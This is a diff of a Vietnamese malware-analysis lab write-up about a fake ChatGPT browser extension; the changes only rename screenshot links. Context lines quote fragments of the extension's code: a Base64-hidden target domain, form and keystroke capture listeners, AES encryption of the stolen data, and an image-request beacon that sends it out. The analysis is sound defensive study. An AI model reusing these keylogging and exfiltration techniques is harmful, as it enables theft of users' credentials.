@@ -21,7 +21,7 @@ Your task is to perform a thorough analysis of this extension identify its malic
 const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
 ```
 
-![Pasted image 20260816105125.png](./images/Pasted%20image%2020260816105125.png)
+![FakeGPT Lab-1.png](./images/FakeGPT%20Lab-1.png)
 Chuỗi kết thúc bằng dấu `==` là một dấu hiệu thường gặp của dữ liệu được encode bằng **Base64** do cơ chế padding của định dạng này.
 
 >Base64
@@ -36,7 +36,7 @@ d3d3LmZhY2Vib29rLmNvbQ==
 ```
 
 Tiến hành decode chuỗi này:
-![Pasted image 20260816105129.png](./images/Pasted%20image%2020260816105129.png)
+![FakeGPT Lab-2.png](./images/FakeGPT%20Lab-2.png)
 
 Kết quả:
 ```
@@ -76,7 +76,7 @@ img.src =
 document.body.appendChild(img);
 ```
 
-![Pasted image 20260816105134.png](./images/Pasted%20image%2020260816105134.png)
+![FakeGPT Lab-3.png](./images/FakeGPT%20Lab-3.png)
 
 `new Image()` tạo một HTML image element, tương đương với:
 ```js
@@ -114,7 +114,7 @@ if (
 }
 ```
 
-![Pasted image 20260816105137.png](./images/Pasted%20image%2020260816105137.png)
+![FakeGPT Lab-4.png](./images/FakeGPT%20Lab-4.png)
 
 Extension thực hiện ít nhất hai phép kiểm tra:
 ```js
@@ -149,7 +149,7 @@ document.addEventListener('submit', function(event) {
 });
 ```
 
-![Pasted image 20260816105141.png](./images/Pasted%20image%2020260816105141.png)
+![FakeGPT Lab-5.png](./images/FakeGPT%20Lab-5.png)
 
 Event:
 ```js
@@ -180,7 +180,7 @@ document.addEventListener('keydown', function(event) {
 });
 ```
 
-![Pasted image 20260816105144.png](./images/Pasted%20image%2020260816105144.png)
+![FakeGPT Lab-6.png](./images/FakeGPT%20Lab-6.png)
 
 Ở đây extension đăng ký listener thông qua:
 ```js
@@ -222,7 +222,7 @@ img.src =
     encodeURIComponent(encryptedData);
 ```
 
-![Pasted image 20260816105148.png](./images/Pasted%20image%2020260816105148.png)
+![FakeGPT Lab-7.png](./images/FakeGPT%20Lab-7.png)
 
 Dữ liệu được đưa vào query parameter:
 ```js
@@ -253,7 +253,7 @@ if (username && password) {
 }
 ```
 
-![Pasted image 20260816105151.png](./images/Pasted%20image%2020260816105151.png)
+![FakeGPT Lab-8.png](./images/FakeGPT%20Lab-8.png)
 
 Điều kiện:
 ```js
@@ -291,7 +291,7 @@ const encrypted =
     CryptoJS.AES.encrypt(data, key, { iv: iv });
 ```
 
-![Pasted image 20260816105155.png](./images/Pasted%20image%2020260816105155.png)
+![FakeGPT Lab-9.png](./images/FakeGPT%20Lab-9.png)
 
 Dòng quan trọng nhất là:
 ```js
@@ -335,7 +335,7 @@ Trong phần `permissions` có thể thấy:
 ]
 ```
 
-![Pasted image 20260816105200.png](./images/Pasted%20image%2020260816105200.png)
+![FakeGPT Lab-10.png](./images/FakeGPT%20Lab-10.png)
 
 Trong đó permission đáng chú ý là:
 ```js
